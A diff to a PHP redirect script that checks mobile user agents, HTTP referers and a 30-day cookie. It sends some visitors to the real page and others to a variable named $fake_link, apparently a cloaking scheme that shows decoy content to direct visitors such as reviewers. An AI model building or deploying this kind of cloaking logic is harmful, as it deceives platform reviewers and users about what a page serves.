@@ -24,11 +24,8 @@ if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|c
     redirect($html_page_name);
 
 }else{
-    echo "HTTP : ".$http_referer ."<br>";
 
-    if(!isset($http_referer)){
-
-        echo "COOKI : ".$_COOKIE[$cookie_name] ;
+    if(isset($_COOKIE[$cookie_name])){
         if($_COOKIE[$cookie_name] == "true"){
             redirect($html_page_name);
         }else{
@@ -36,10 +33,21 @@ if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|c
             redirect($fake_link);
         }
     }else{
-        setcookie($cookie_name, "true", time() + (86400 * 30), "/");
-        redirect($html_page_name);
+        if(!isset($http_referer)){
+            if($_COOKIE[$cookie_name] == "true"){
+                redirect($html_page_name);
+            }else{
+                setcookie($cookie_name, "false", time() + (86400 * 30), "/");
+                redirect($fake_link);
+            }
+        }else{
+            setcookie($cookie_name, "true", time() + (86400 * 30), "/");
+            redirect($html_page_name);
+        }
+        
     }
-    
+
+   
 }
 
 
